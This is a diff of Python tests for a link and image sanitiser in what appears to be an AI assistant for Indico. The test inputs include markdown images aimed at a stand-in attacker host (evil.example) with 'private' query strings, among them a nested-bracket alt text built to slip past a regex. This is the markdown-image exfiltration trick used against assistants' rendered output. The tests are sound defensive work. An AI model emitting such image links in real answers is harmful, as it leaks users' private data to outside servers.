@@ -103,5 +103,26 @@ def test_any_other_link_loses_its_address_even_on_github():
 def test_images_are_dropped_to_their_text():
     from indico_assistant.services.knowledge.links import strip_images
 
-    assert strip_images("![status](https://evil.example/c?q=private) ok") == "status ok"
-    assert strip_images("![x][1] and [link](https://github.com/a/b)") == "x and [link](https://github.com/a/b)"
+    assert check(strip_images("![status](https://evil.example/c?q=private) ok"), PAGES, GUIDE, BASE) == "status ok"
+    kept = check(strip_images("![#16](https://github.com/thoth-labs/indico-assistant/pull/16)"), PAGES, GUIDE, BASE,
+                 urls=GITHUB)
+    assert kept == "[#16](https://github.com/thoth-labs/indico-assistant/pull/16)"  # (a link now, not an image)
+
+
+def test_an_image_is_neutralised_whatever_its_alt_text():
+    """(Copilot, PR #17) nested brackets in the alt text slipped past a regex: now every image marker goes."""
+    from indico_assistant.services.knowledge.links import strip_images
+
+    for image in ("![a [b]](https://evil.example/?private)", "![a\\]b](https://evil.example/?p)", "![][1]"):
+        assert "![" not in strip_images(image)
+    text = check(strip_images("![a [b]](https://evil.example/?private) ok"), PAGES, GUIDE, BASE, urls=GITHUB,
+                 strict=True)
+    assert "evil.example" not in text and "![" not in text
+
+
+def test_strict_mode_keeps_only_the_given_urls_and_this_indico():
+    """(Copilot, PR #17) a connector answer has no use for Indico's docs site: it is not page-checked."""
+    text = "[docs](https://docs.getindico.io/en/stable/?q=private) [#16](https://github.com/thoth-labs/indico-assistant/pull/16)"
+    assert check(text, PAGES, GUIDE, BASE, urls=GITHUB, strict=True) == (
+        "docs [#16](https://github.com/thoth-labs/indico-assistant/pull/16)")
+    assert "docs.getindico.io" in check(text, PAGES, GUIDE, BASE, urls=GITHUB)  # (the knowledge answer keeps it)
